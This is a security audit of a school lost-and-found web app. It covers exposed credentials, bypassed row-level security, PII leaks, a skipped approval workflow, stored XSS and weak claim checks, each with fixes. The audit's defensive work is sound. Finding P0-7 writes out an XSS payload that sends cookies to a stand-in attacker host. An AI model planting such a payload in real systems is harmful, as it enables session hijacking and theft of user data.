# LostLink — Production Readiness Audit

**System:** LostLink — DLSAU Lost & Found
**Audited commit:** `ff2809b`
**Date:** 2026-10-21
**Target:** Real school deployment (Security Office staff + ~130 student/faculty accounts)
**Verdict:** **NOT PRODUCTION READY.**

---

## 1. Executive verdict

The UI, information architecture, and domain model are good enough to demo. The
engineering underneath is not safe to put in front of real students.

The system is best described as **a polished front end wrapped around a
service-role database layer**, with demo fallbacks that silently fake success.
Four properties make a school deployment unsafe today:

1. **Credentials are already exposed.** A live-universal password, plaintext
   admin passwords, and Supabase keys exist in the working tree and in git
   history. Anyone who has ever cloned this repo has them.
2. **Authorization is not enforced.** Almost every read and write uses the
   service-role key, so Row Level Security is bypassed. Unapproved reports,
   reporter emails, and reference codes are readable by anonymous callers.
3. **Reports skip the approval workflow.** `POST /api/items` writes
   `status: "approved"` directly, so the Security Office queue is never
   populated and nothing is ever reviewed.
4. **The client lies about success.** Report and claim submissions show a
   success toast even when the server rejected the request.

There are also privilege-escalation, stored-XSS, and suspended-account paths
that a single motivated student could find.

**Do not deploy until every P0 item in §4 is closed and the §9 acceptance
criteria pass.**

### Implementation status (2026-10-21, after this audit)

A hardening pass is now in the working tree (not committed). It closes the
code-level P0s:

- Credential files and the credential-doc generator were deleted; the seed
  script requires an explicit strong `SEED_PASSWORD` and refuses the old
  universal password.
- Roles and `active` come from `profiles`; the email allowlist is gone.
  Suspended accounts get no session; refresh-token rotation is persisted.
- Reports insert as `pending`; `status=all` is admin-only; unapproved reports,
  reporter emails, reference codes, and `hide_photo` items are hidden from
  students.
- Claims enforce found/approved/not-own/not-admin/no-duplicate on the server;
  students can withdraw; approval marks the item claimed and denies rivals.
- Fake success paths are removed; admin removal is a soft delete; stored XSS
  and inline handlers are fixed; temp passwords use `crypto`.
- Photos are stored as private-bucket paths and rendered with signed URLs
  (requires `docs/migrations-production.sql`); uploads check magic bytes.
- Astro 7.4.1 / adapter 14.4.1 / Zod 4; `npm audit --omit=dev` reports 0.

Still owner-side before deployment: rotate the exposed Supabase keys and
passwords, purge the public git history, apply the SQL migration, configure
Cloudflare secrets/bindings, enable Turnstile, replace the in-memory rate
limiter, remove CSP `'unsafe-inline'`, add staging/monitoring/backups, and run
manual screen-reader checks.

---

## 2. Scope and method

Reviewed:

- All of `src/` (pages, API routes, actions, middleware, lib, components, islands)
- `docs/schema.sql`, `docs/migrations.sql`, `docs/rules.md`, `docs/security.md`
- `package.json` / `package-lock.json`, Astro and Cloudflare adapter config
- `scripts/`, `tests/`, `.env`, `.dev.vars`, git history
- `npm run check` → **0 errors, 0 warnings, 12 hints**
- `npm audit --omit=dev` → **9 advisories: 1 critical, 5 high, 2 moderate, 1 low**

Not performed: live penetration testing against the deployed host; running
`npm test` (it mutates the live Supabase project — see P1-11).

Severity:

| Level | Meaning |
| --- | --- |
| **P0 — Blocker** | Data breach, account takeover, or core workflow broken. Must fix before deploy. |
| **P1 — High** | Exploitable or corrupts records under normal use. Fix before opening to students. |
| **P2 — Medium** | Reliability, privacy, accessibility, and operability gaps. Fix before end of term. |
| **P3 — Low** | Polish, maintainability, demo leftovers. |

---

## 3. What is genuinely good

Worth preserving during the rewrite of the data layer:

- Server-side Zod validation on auth actions; no client-trusted payloads.
- `httpOnly`, `SameSite=Lax` cookies; session tokens are not in `localStorage`.
- Strong baseline security headers (HSTS, `frame-ancestors 'none'`,
  `object-src 'none'`, `base-uri 'self'`, `form-action 'self'`).
- Constant-time comparison for the dev-session token; safe redirect helper.
- An audit table (`admin_log`) and a custody model, even if underused.
- Clear, accessible-ish visual design; consistent status badges and empty states.
- TypeScript is clean (`astro check` passes).

The problem is not taste. It is that the security and workflow contracts in
`docs/security.md` and `docs/rules.md` were never wired into the code.

---

## 4. P0 — Blockers

### P0-1. Live credentials are committed and sitting on disk

**Evidence**

- `account_credentials.md` at the repo root lists ~130 accounts and the
  universal password `[REDACTED — rotate it]`, including admin accounts.
- `scripts/generate-credentials-doc.mjs` is **tracked by git** and hardcodes
  plaintext passwords for every seeded account.
- `scripts/seed-dlsau-accounts.mjs` creates accounts with a shared password and
  `email_confirm: true`.
- `git log --all` shows `database/ACCOUNTS_CREDENTIALS.md` and login
  `.xlsx` sheets were committed in `404adaf`, `07c6524`, `4f1d596`, `1948d97`,
  `01c6f22`.
- `.env` and `.dev.vars` both exist on disk with the **production** Supabase
  URL and service-role key. Both are gitignored — but anyone who copies the
  folder, zips it, or screenshots it leaks full database control.

**Impact:** Total compromise. The service-role key bypasses RLS. The universal
password logs into 130 accounts, including at least four admins. Git history
cannot be "deleted" by deleting the file.

**Fix**

1. **Rotate now, before any other work:**
   - Supabase `service_role` and `anon` keys (Dashboard → Settings → API → rotate).
   - Every seeded account password; force reset on next login.
   - All four `ADMIN_EMAILS` passwords; require MFA on the Supabase org.
   - Turnstile keys, `DEV_SESSION_SECRET`, and any Resend key.
2. Delete `account_credentials.md`, `database/ACCOUNTS_CREDENTIALS.md`, and the
   `.xlsx` files from disk.
3. Delete `scripts/generate-credentials-doc.mjs` and remove the credential
   generation from `scripts/seed-dlsau-accounts.mjs`.
4. **Purge git history** with `git filter-repo --path ... --invert-paths`
   (or BFG), force-push, and have every collaborator re-clone. Rotating keys is
   mandatory even after the purge, because history may already be cloned.
5. Add a pre-commit secret scanner (gitleaks) and a CI secret-scan job.
6. Never auto-confirm seeded accounts. Provision via invite links or SSO.

> This is the one item that cannot be deferred. Everything else can ship behind
> a closed beta; this cannot.

---

### P0-2. Open registration + email allowlist = privilege escalation

**Evidence**

- `src/actions/index.ts:188` assigns the role from
  `roleForEmail(email) === "admin" ? "admin" : "user"` at sign-up time.
- `src/lib/session.ts:62-75` trusts a hardcoded `ADMIN_EMAILS` set and returns
  `admin` purely from the email string.
- `src/actions/index.ts:144` redirects to `/admin` on the same basis.
- Sign-up does not verify that the registrant owns the DLSAU mailbox beyond the
  domain suffix check.

**Impact:** Anyone who registers `zian.piangco@dlsau.edu.ph` (or any other
allowlisted address) before the real owner does becomes an administrator, with
access to claims, user management, password resets, and destructive deletes.

**Fix**

- Remove email-based admin elevation entirely. Admin is a database fact:
  `profiles.role`, written only by an existing admin.
- Require verified email (`email_confirmed_at`) before any session is issued.
- Better: disable public sign-up and use DLSAU Google Workspace SSO
  (`hd=dlsau.edu.ph` + server-side ID-token verification), or admin-issued
  invites.
- Add a DB constraint/trigger preventing self-service role changes.
- Delete `ADMIN_EMAILS` and `roleForEmail()`.

---

### P0-3. RLS is bypassed everywhere via the service-role key

**Evidence**

- `src/lib/supabase.ts:103,204,254` — the admin client prefers
  `SUPABASE_SERVICE_ROLE_KEY`, with anon as fallback.
- `src/pages/api/items.ts:22` — every GET uses the admin client.
- `src/pages/api/claims.ts`, `src/pages/api/upload.ts`, `src/pages/api/admin/actions.ts`,
  `src/pages/item/[id].astro`, `src/pages/admin.astro` — same pattern.
- `docs/security.md` defines RLS rules; the implementation never exercises them.

**Impact:** The security model documented in `docs/security.md` does not exist
at runtime. Any bug in an API route becomes a full-table read/write. This is
the root cause of P0-4 and P0-5.

**Fix**

- Split clients explicitly:
  - `getUserClient(accessToken)` for all user-facing reads/writes → RLS applies.
  - `getServiceClient()` only inside admin endpoints, after an explicit
    server-side role check, with a comment naming the reason.
- Never fall back from service role to anon. Fail closed.
- Write RLS policies for `items`, `claims`, `profiles`, `notifications`,
  `admin_log`, plus storage policies.
- Add integration tests that attempt each forbidden read/write **as a normal
  user** and assert failure (one test per rule, per `docs/security.md`).
- Add `security definer` RPCs for the few multi-table operations that must be
  atomic (claim approval, custody handover) instead of trusting the route.

---

### P0-4. Unapproved reports and reporter PII are publicly readable

**Evidence**

- `src/pages/api/items.ts:27` — `select("*")`, then `:33` only filters when a
  status is supplied.
- `src/pages/api/items.ts:33-34` — `?status=all` returns rows in **any** status,
  including `pending` and `rejected`, while `:33` skips filtering entirely.
- `src/pages/item/[id].astro:35` — `select("*, profiles!reporter_id(id, full_name, email)")`
  with no status or ownership check; `:65` exposes `reporterEmail` and `:62`
  exposes `referenceCode` for pending/rejected items.
- `src/middleware.ts:45` treats `/items` as a public prefix.

**Impact:** Anyone can enumerate pending reports (including rejected ones with
rejection reasons), read reporter names and DLSAU emails, and harvest reference
codes used for claim verification. This violates the stated rule "Normal users
must never read other people's unapproved reports" and is a Privacy Act
(RA 10173) exposure.

**Fix**

- Public list: `status = 'approved'` only, no `status` query parameter.
- Item page: fetch by ID **and** `status = 'approved'`, or require the caller to
  be the reporter or an admin.
- Never select `profiles.email` in a public response. Return `full_name` only if
  the workflow requires it.
- Remove `reference_code` from public item payloads; it belongs in the
  reporter's own profile and the admin queue.
- Return `404` (not `403`) for non-public items to avoid existence oracles.
- Replace `select("*")` with explicit column lists.

---

### P0-5. Report submission bypasses admin approval (core workflow broken)

**Evidence**

- `src/pages/api/items.ts:179` — `status: "approved", // Set approved for live campus feed display`.
- `src/pages/admin.astro:129` counts `status = 'pending'`, which can never
  increase for student reports.
- `docs/rules.md` and `AGENTS.md` define `pending → approved` as the required flow.

**Impact:** Every student report is immediately public. The Security Office
never reviews anything. The whole "admin approval" pillar of the system is
non-functional, and inappropriate/incorrect content goes live unreviewed.

**Fix**

- Insert with `status: "pending"` (the schema default, `docs/schema.sql:42`).
- Admin queue shows pending items; approve/reject mutations already exist but
  are currently dead code for the normal path.
- Reject requires a reason and notifies the reporter.
- Add a "pending" confirmation state in the UI ("Submitted for review", not
  "Posted to Campus Feed").
- Add a regression test asserting a new report is not visible at `/` or
  `GET /api/items` until approved.

---

### P0-6. Client fakes success on failed report and claim submissions

**Evidence**

- `src/pages/index.astro:803-821` — claim `fetch` result is ignored;
  `successMsg` is shown and a success toast fires unconditionally.
- `src/pages/index.astro:1133-1342` — report flow checks the upload response
  but then shows the success panel and "Report posted to Campus Feed" regardless
  of the `/api/items` response.
- `src/pages/index.astro:1309-1311` — success panel is revealed directly.
- Base64 image fallback can persist a data URL as the "photo" when upload fails.

**Impact:** Students believe a report or claim was filed when it was not. The
item may be missing from the feed, and the student will not re-file. This is the
most damaging *non-security* bug in the system: it destroys trust in the
lost-and-found process.

**Fix**

- Check `res.ok` and the parsed `{ ok }` flag at every step.
- On failure: keep the form populated, show the server error, and offer retry.
- Only reveal the success panel after the item ID/reference code is returned.
- Never fall back to storing a base64 data URL; fail the submission.
- Add an idempotency key so a retried report cannot duplicate.

---

### P0-7. Stored XSS in the admin user-management modal

**Evidence**

- `src/components/admin/UsersManagement.astro:1742` —
  `deleteModalDesc.innerHTML = \`... <strong>${userName}</strong> ... ${userEmail} ...\``
- `userName` comes from `data-user-name`, which is populated from profile data
  that a student controls at registration (`:1736-1737`).
- `src/middleware.ts:23` allows `script-src 'self' 'unsafe-inline'`, so inline
  event handlers survive CSP.

**Impact:** A student sets their full name to
`<img src=x onerror="fetch('https://evil/?c='+document.cookie)">`. When an admin
opens the delete dialog, script runs in the admin's session. Session cookies are
`httpOnly`, but the attacker can still issue authenticated admin API calls
(approve, delete, reset passwords) from the admin's browser.

**Fix**

- Never interpolate user data into `innerHTML`. Use `textContent`, or build DOM
  nodes and assign `.textContent` for user-controlled fields.
- Remove `'unsafe-inline'` from `script-src`; use Astro's script bundling plus
  nonces or hashes. Keep `style-src 'unsafe-inline'` only if Tailwind requires it.
- Server-side: reject/escape control characters in `full_name`; enforce length
  and a safe character set.
- Add a CSP report-only rollout, then enforce.

---

### P0-8. `hide_photo` is stored but never enforced; photos are in a public bucket

**Evidence**

- `src/pages/api/items.ts:160,177` — sets `hide_photo` for IDs/cards.
- No code anywhere reads `hide_photo` (grep finds only the write and unrelated
  lightbox helpers).
- `src/lib/storage.ts:72-78` — uploads to a bucket and returns
  `publicData.publicUrl`.
- No storage RLS or signed URLs.

**Impact:** Photos of student IDs, wallets, and cards are world-readable by
URL, forever, including for rejected and pending reports. This is a direct
privacy and fraud risk (ID photos can be used for impersonation).

**Fix**

- Make the bucket **private**. Serve images via short-lived signed URLs
  generated server-side after an authorization check.
- Enforce `hide_photo`: blur/omit the image for everyone except the reporter and
  admins, or store only a redacted thumbnail.
- Strip EXIF (including GPS) on upload; re-encode with `sharp` server-side.
- Validate magic bytes, not just the declared MIME type.
- Delete objects when an item is deleted/rejected (today they orphan).

---

### P0-9. Any authenticated user can claim any item, including their own

**Evidence**

- `src/pages/api/claims.ts:189-251` — validates only that `itemId` and a
  20-character proof exist.
- Missing checks: item exists, `type = 'found'`, `status = 'approved'`,
  claimant ≠ reporter, no existing pending/verified claim, claimant not an admin.
- `:227-233` — a non-UUID `itemId` silently maps to *the first item in the
  database*, so a malformed/demo ID creates a claim against an arbitrary item.
- `:211-214` — falls back to *any* profile when the caller's profile is missing,
  attributing the claim to a random student.
- `:254` — notifies only the first 3 admins.

**Impact:** Students can claim items that aren't found, aren't approved, or are
their own; claims can be attached to unrelated items; claim records can be
attributed to the wrong person. Duplicate claims race because there is no unique
constraint or transaction.

**Fix**

- Fetch the item and assert `type='found' AND status='approved' AND reporter_id <> claimant`.
- Reject non-UUID IDs with `400`; delete all demo-ID mapping.
- Delete the "any profile" fallback; if the caller has no profile, fail.
- Add `unique (item_id, claimant_id) where status in ('pending','verified')`.
- Wrap claim insert + notifications in a transaction/RPC.
- Notify all admins (or a role-based fan-out), not `limit(3)`.
- Re-check on approval that the item is still approved (someone else may have
  claimed it) and that no other claim was verified.

---

## 5. P1 — High severity

### P1-1. Suspended users keep full access
`src/lib/session.ts:124-131` resolves the session from the token and role only.
`profiles.active` is never checked. Suspension is cosmetic; the suspend button
in the admin panel does not lock anyone out. **Fix:** check `active` (and
`must_change_password`) in `resolveUser`, return `null`/`403`, and delete the
refresh cookie.

### P1-2. Password recovery is insecure and dishonest
- `src/pages/api/admin/actions.ts:484` generates a temp password with
  `Math.random()` (not cryptographically secure).
- `:499-502` writes the plaintext temp password into the `notifications` table,
  where it persists indefinitely.
- `src/actions/index.ts:243` records the reset request, but any
  `@dlsau.edu.ph` address receives a generic "sent" response even when no
  account exists (fine for enumeration), yet the in-person flow has no expiry,
  no single-use guarantee, and no revocation.
- `src/actions/index.ts:293-297` swallows `updateUserPassword` errors in some
  paths and still clears `must_change_password` at `:307`.

**Fix:** use `crypto.getRandomValues`, store only a hash, expire in 15–30
minutes, single use, force change on next login, never persist plaintext, and
only clear the flag after a confirmed password update.

### P1-3. Admin password-reset and delete flows are destructive by design
- `src/pages/api/admin/actions.ts:288-294` deletes `admin_log` and `claims`
  before deleting the item. The audit trail is destroyed by the very action it
  should record.
- `:252-260` "fallback for mock demo items" writes fake audit rows when the
  item is not found.
- `src/pages/api/items.ts:283-286` has the same cascade-delete pattern.
- Deletion has no soft-delete, no confirmation token, and no retention window.

**Fix:** soft-delete (`deleted_at`), retain audit rows, require a typed
confirmation for destructive actions, and never fabricate audit entries.

### P1-4. Weak, predictable reference codes
`src/pages/api/items.ts` generates short reference codes used as the claim
verification secret. They are displayed publicly on the item page
(`src/pages/item/[id].astro:195-205`). **Fix:** use a 128-bit random token,
show it only to the reporter and admins, and treat it as a bearer secret.

### P1-5. Admin metrics silently return zero
`src/pages/admin.astro:120` uses `.neq("status", "returned")` and `:133` uses
`.in("status", ["claimed", "returned"])`. `returned` is not in the
`item_status` enum (`docs/schema.sql:5`). Postgres rejects/ignores these
comparisons, so "returned this month" is always 0. **Fix:** remove `returned`;
use `claimed` for found and `resolved` for lost.

### P1-6. In-memory rate limiting does not work on Cloudflare
`src/lib/rateLimit.ts:12` stores attempts in a module-level `Map`. Workers
isolates are ephemeral and horizontally scaled, so an attacker gets a fresh
counter per isolate. **Fix:** use Cloudflare's Rate Limiting binding, Durable
Objects, or a Supabase table with atomic increment; keep the in-memory limiter
only as a best-effort local fallback.

### P1-7. Turnstile is configured but not enforced
`TURNSTILE_SITE_KEY`/`TURNSTILE_SECRET_KEY` are empty in `.env`, and no
`siteverify` call exists in the login/report paths. **Fix:** implement
server-side verification, fail closed in production, and add it to login,
registration, forgot-password, report, and claim.

### P1-8. Demo fallbacks write or fabricate data in production paths
- `src/pages/api/admin/actions.ts:63,114-122,203,252-260` map demo IDs to
  real items and insert fake admin-log entries.
- `src/pages/api/claims.ts:227-233` maps unknown item IDs to the first item.
- `src/pages/item/[id].astro:90` serves a mock item with `status: "approved"`.
- `src/pages/index.astro:205-206,921-926` keeps removed/claimed items in
  `sessionStorage` so the demo "sticks".

**Fix:** delete every mock/demo branch. Demo data belongs in a seed script
against a non-production project, never in request handlers.

### P1-9. No transactional integrity for custody/claim transitions
`src/actions/index.ts:373-441` performs item update, claim update, notification,
and audit insert as four independent calls. A failure mid-way leaves the item
claimed but the claim pending, or an audit row with no state change. Claim
approval in `src/pages/api/claims.ts:118-175` has the same issue. **Fix:** move
these into Postgres functions (`security definer`) called via `rpc()`, with a
single transaction and row locks.

### P1-10. Sessions never refresh cleanly and role is looked up on every request
`src/lib/session.ts:133-142` refreshes the access cookie but never persists the
rotated refresh token, so refresh-token rotation eventually invalidates the
session. `resolveRole` hits the DB on every request. **Fix:** persist the new
refresh token, cache the role in a signed cookie with a short TTL, and add a
`/api/auth/refresh` endpoint.

### P1-11. `npm test` mutates the live database
`tests/live-features.test.ts` connects with the service-role key from
`readEnv()` and inserts/updates notifications. Running tests locally or in CI
writes to production. **Fix:** split into `test:unit` (no network) and
`test:integration` (dedicated project, seeded + torn down). Make `test` run only
unit tests. Never let CI hold a production service key.

### P1-12. Dependencies have a critical advisory
`npm audit --omit=dev`: **1 critical, 5 high, 2 moderate, 1 low**, including
Astro XSS advisories and vulnerable `sharp`/`undici`/`ws`/`vite` transitives.
`package.json` pins `astro 5.18.2` and `@astrojs/cloudflare 12.6.13`. **Fix:**
upgrade to the current Astro + Cloudflare adapter majors, re-run `check` and
the E2E suite, and add `npm audit --audit-level=high` to CI with Dependabot.

---

## 6. P2 — Medium severity

### Data model and integrity
- `docs/schema.sql` has no `updated_at`, no `deleted_at`, no `approved_at`,
  `resolved_at`, or `claimed_at`, and no FK `on delete` policy. Status history
  is unrecoverable.
- `claims` has no unique constraint for active claims per item/claimant.
- `notifications` has no type, no read-at index, and stores secrets (P1-2).
- `admin_log` uses free-text `action` strings parsed in `src/pages/admin.astro:420-423`;
  one format change breaks the Users tab.
- `items.status` allows impossible transitions (`rejected → claimed`). Add a
  trigger or state machine.
- Missing composite indexes for the hot queries: `(status, created_at)`,
  `(type, status, created_at)`, `(claimant_id, status)`, `(reporter_id, created_at)`.
- `src/pages/admin.astro:176` loads `.limit(500)` profiles into memory and filters
  client-side; this breaks past 500 users and leaks the full directory to the
  admin page payload.

### Privacy / RA 10173
- Reporter email is exposed publicly (P0-4).
- No data-retention policy for rejected items, claim proofs, or photos.
- No audit of who viewed a claim proof.
- `src/pages/privacy.astro` exists but does not match actual data flows
  (public photo bucket, plaintext passwords in notifications).
- No consent record for photo upload or ID handling.
- No data-subject export/delete path.

### Accessibility (WCAG 2.2 AA)
- Modal focus trapping/restore is inconsistent; background content is not
  `aria-hidden` while dialogs are open.
- Toast messages are not consistently in a live region, so screen readers miss
  success/error feedback.
- Several icon-only buttons lack accessible names.
- Custom dropdowns/filters are div-based and not keyboard-operable.
- Color contrast of muted text on the cream background is below 4.5:1 in places.
- No skip link on all pages; focus outline is removed in some components.
- `src/pages/index.astro` lightbox has no keyboard close (`Esc`) or focus return.

### Reliability
- No global 404/500 pages; no `robots.txt`; no static `_headers`.
- No request IDs, structured logging, or error tracking (Sentry/Highlight).
- `console.warn` is the only observability; production errors are invisible.
- No health check that verifies DB and storage connectivity.
- Uploads orphan when item insert fails; no cleanup job.
- Report/claim forms have no double-submit protection.

### Performance
- `select("*")` on list endpoints ships unused columns.
- `src/pages/admin.astro` runs ~10 queries per load, some unpaginated.
- Every request resolves role with a DB round-trip.
- Photos are served at original resolution; no `srcset` or compression.
- Fonts load from Google Fonts with no `font-display` strategy check (CSP allows it,
  but it is a third-party dependency and a privacy consideration).

---

## 7. Missing workflows vs. `docs/rules.md`

These are not bugs in existing code — they are required behaviors that were
never built. A school will notice them on day one.

| Required behavior | Status | Needed |
| --- | --- | --- |
| Duplicate report warning before submit | Missing | Fuzzy match on name/category/location/date; warn, allow override with reason. |
| Reporter can edit/delete own pending report | Missing | `PATCH`/`DELETE /api/items/:id` with ownership + `status='pending'` guard. |
| Reject with a reason + resubmission | Partial | Reason is stored; reporter cannot see it or resubmit. Add notification + edit flow. |
| Lost item `resolved` | Missing | "I found my item" action → `resolved`, notify admins, close claims. |
| Claim `withdrawn` | Missing | Student can withdraw a pending claim. |
| Lost item "Did you find this?" | Missing | Contact/report-found flow linked to the lost report. |
| Handover confirmation | Partial | Custody exists; no two-party confirmation, no pickup code, no receipt. |
| Admin cannot claim | Missing | Server-side rule (P0-9). |
| Claim rules enforced server-side | Missing | All rules currently live in UI copy only. |
| Notification preferences / email | Missing | In-app only; no digest or email fallback. |
| Account deletion / data export | Missing | Privacy compliance. |

---

## 8. Operational readiness

| Area | State | Required |
| --- | --- | --- |
| Cloudflare config | No `wrangler.toml`/`wrangler.jsonc` | Commit config with env bindings, compatibility date, and observability. |
| Node/pnpm pinning | No `.nvmrc`/`.node-version`, no `engines` | Pin Node 22 LTS and package manager. |
| CI/CD | No `.github/workflows` | PR job: install, `astro check`, unit tests, build, `npm audit`. |
| Environments | One live Supabase project used for dev and "prod" | Separate dev / staging / prod projects and keys. |
| Migrations | Ad-hoc SQL in `docs/` | Versioned migrations (Supabase CLI) applied in CI. |
| Backups | Unknown / manual | Daily automated backups + tested restore quarterly. |
| Monitoring | None | Error tracking, uptime check, alert on 5xx and auth failures. |
| Logging | `console.*` | Structured logs with request ID; no PII/secrets. |
| Rate limiting | In-memory (broken) | Cloudflare binding or DB-backed. |
| Secrets | `.env` and `.dev.vars` on disk with prod keys | Cloudflare secrets; `.env` for local only, never prod. |
| Incident response | None | Runbook: rotate keys, disable accounts, notify DPO. |
| Accessibility audit | None | axe + manual keyboard/screen-reader pass. |
| Load/perf | None | k6/Artillery smoke test at 100 concurrent users. |
| Legal | Privacy page only | DPA/RA 10173 review, retention schedule, consent copy. |

Security headers are set in middleware, but there is **no** `public/_headers`
for static assets and **no** `robots.txt` (admin/profile should be
`noindex`).

---

## 9. Remediation roadmap

Estimates assume one competent full-stack dev.

### Phase 0 — Stop the bleeding (1–2 days, do first)
1. Rotate Supabase anon/service keys, all admin and seeded passwords,
   `DEV_SESSION_SECRET`, Turnstile keys.
2. Delete credential files and `scripts/generate-credentials-doc.mjs`; purge git
   history; force-push; re-clone.
3. Set `DEV_LOGIN_BYPASS=false` everywhere except local; remove prod keys from
   `.env`/`.dev.vars`; create separate dev/staging/prod projects.
4. Upgrade Astro + Cloudflare adapter; clear `npm audit` critical/high.
5. Remove all mock/demo fallbacks from request handlers.
6. Unset `test` from CI; split unit vs. live tests.

**Exit:** no secrets in the repo or history; `npm audit` has no high/critical;
a fresh clone cannot reach production data.

### Phase 1 — Auth, authorization, data access (3–5 days)
1. Remove `ADMIN_EMAILS`; role comes only from `profiles.role`.
2. Require verified email / SSO; disable open self-registration.
3. Check `profiles.active` and `must_change_password` in `resolveUser`.
4. Split anon/user/service clients; make RLS real; fail closed.
5. Fix `?status=all`, item-page IDOR, `select("*")`, reporter email, and
   reference-code exposure.
6. Fix stored XSS; remove `'unsafe-inline'` from `script-src`.
7. RLS integration tests: one per rule.

**Exit:** an anonymous user and a normal user can only see approved items; a
suspended user is logged out; no endpoint returns another user's PII; XSS
payload is rendered inert.

### Phase 2 — Workflow correctness (3–5 days)
1. Reports insert as `pending`; admin queue populates; approve/reject works.
2. Claim validation: found + approved + not own + not duplicate + not admin.
3. Transactional claim approval and custody handover via RPC.
4. Client checks every response; no fake success; no base64 fallback.
5. Fix admin `returned` enum queries and audit-log parsing.
6. Add edit/delete pending, reject reason + resubmit, lost `resolved`,
   claim `withdrawn`, duplicate warning.
7. Secure password recovery: CSPRNG, hashed, expiring, single-use, no plaintext.

**Exit:** end-to-end test — report → pending → approve → claim → verify →
claimed → resolved — with no manual DB edits and no false success states.

### Phase 3 — Data, storage, privacy (2–4 days)
1. Private bucket + signed URLs + `hide_photo` enforcement + EXIF strip.
2. Schema: timestamps, soft delete, FKs, unique constraints, status trigger,
   indexes.
3. Retention policy and cleanup job for photos/claims/rejected items.
4. Data export/delete; update privacy copy.
5. Audit trail: append-only, no deletes, actor always resolved (no fallback).

**Exit:** ID photos are not publicly reachable; deleted items retain audit
history; schema has no impossible states.

### Phase 4 — Operations (2–3 days)
1. `wrangler.jsonc`, Node pin, `_headers`, `robots.txt`, 404/500.
2. CI: typecheck, unit tests, build, audit, secret scan.
3. Staging environment + versioned migrations.
4. Error tracking, uptime monitor, alerts, structured logs.
5. Backups + restore drill; incident runbook.

**Exit:** deploy is reproducible from CI; an error in production is visible
within minutes; a restore has been performed successfully.

### Phase 5 — Accessibility & polish (2–3 days)
1. axe scan + manual keyboard/screen-reader pass on all core flows.
2. Focus management in modals, live regions for toasts, labels for icon buttons.
3. Keyboard-operable filters/lightbox; contrast fixes.
4. Load smoke test; image compression/srcset.

**Exit:** WCAG 2.2 AA on login, report, browse, item, claim, admin; Lighthouse
a11y ≥ 95 on core pages.

---

## 10. Production acceptance criteria

Do not open to students until all are true:

- [ ] No plaintext credentials in the working tree, git history, or CI logs.
- [ ] All keys/passwords rotated after the history purge.
- [ ] Separate prod Supabase project; service key only in Cloudflare secrets.
- [ ] `DEV_LOGIN_BYPASS=false` in prod and verified at boot.
- [ ] Role comes from the database; no email allowlist.
- [ ] Suspended users cannot authenticate.
- [ ] Anonymous users see only `approved` items; no PII, no reference codes.
- [ ] Item detail returns 404 for non-public items.
- [ ] New reports are `pending` and invisible until approved.
- [ ] Claim rules enforced server-side, with DB uniqueness.
- [ ] No client-side false success paths.
- [ ] `hide_photo` enforced; bucket private; signed URLs; EXIF stripped.
- [ ] No stored XSS; CSP without `script-src 'unsafe-inline'`.
- [ ] Turnstile verified server-side on auth/report/claim.
- [ ] Rate limiting works across isolates.
- [ ] Password reset is CSPRNG, hashed, expiring, single-use.
- [ ] Destructive actions are soft-delete + audited.
- [ ] Unit tests in CI; live tests never touch prod.
- [ ] `npm audit` clean at high/critical; Astro upgraded.
- [ ] Staging deploy + rollback tested.
- [ ] Backups + restore tested.
- [ ] Error tracking and uptime alerts live.
- [ ] Privacy notice matches actual data flows; retention defined.
- [ ] WCAG 2.2 AA pass on the five core flows.

---

## 11. First 10 commits (suggested order)

1. `chore(security): remove credential files, purge demo login bypass`
2. `chore(deps): upgrade astro and cloudflare adapter, clear audit`
3. `refactor(auth): role from profiles only, remove ADMIN_EMAILS`
4. `fix(session): enforce active + verified email, persist refresh rotation`
5. `refactor(db): split user/service clients, enable RLS`
6. `fix(items): pending on create, approved-only public reads, no PII`
7. `fix(claims): server-side rules, uniqueness, transactional approval`
8. `fix(ui): honor API responses, remove fake success and mock fallbacks`
9. `fix(security): escape admin UI, drop unsafe-inline CSP, enforce Turnstile`
10. `chore(ops): wrangler config, CI, migrations, monitoring`

---

## 12. Files that must change

| File | Why |
| --- | --- |
| `scripts/generate-credentials-doc.mjs` | Hardcoded plaintext credentials. Delete. |
| `scripts/seed-dlsau-accounts.mjs` | Universal password + auto-confirm. Rewrite as invite/SSO. |
| `account_credentials.md`, `database/ACCOUNTS_CREDENTIALS.md`, `*.xlsx` | Live secrets. Delete + purge history. |
| `.env`, `.dev.vars` | Prod keys + bypass on disk. Rotate, separate, remove prod values. |
| `src/lib/session.ts` | Email allowlist, missing `active`, refresh bug. |
| `src/lib/supabase.ts` | Service-role fallback. |
| `src/lib/rateLimit.ts` | In-memory limiter. |
| `src/lib/storage.ts` | Public URLs, MIME trust, no EXIF strip. |
| `src/middleware.ts` | CSP `unsafe-inline`, `/items` public prefix, per-request role lookup. |
| `src/pages/api/items.ts` | Auto-approve, `status=all`, `select("*")`, destructive delete. |
| `src/pages/api/claims.ts` | Missing rules, arbitrary item/profile fallbacks, non-transactional. |
| `src/pages/api/admin/actions.ts` | Weak temp password, plaintext notification, audit deletion, demo fallbacks. |
| `src/actions/index.ts` | Role escalation at signup, password reset, non-transactional custody. |
| `src/pages/item/[id].astro` | IDOR, reporter email, public reference code. |
| `src/pages/admin.astro` | Invalid `returned` enum, mock users, 500-row load, audit parsing. |
| `src/pages/index.astro` | Fake success, base64 fallback, sessionStorage demo state. |
| `src/components/admin/UsersManagement.astro` | Stored XSS via `innerHTML`. |
| `docs/schema.sql`, `docs/migrations.sql` | Missing constraints, timestamps, indexes. |
| `tests/live-features.test.ts` | Mutates production. |
| `package.json` / lockfile | Vulnerable Astro stack, no `engines`, dangerous `test`. |

---

## 13. Bottom line

The fastest path to a safe deployment is **not** to keep patching routes. It is:

1. **Rotate and purge** (today).
2. **Make the database enforce the rules** (RLS + constraints), so route bugs
   cannot become data breaches.
3. **Stop faking success** in the client.
4. **Turn the admin approval workflow back on** — it is the product.

Everything else in this report is important, but those four decide whether the
school can trust the system with student IDs and lost property.
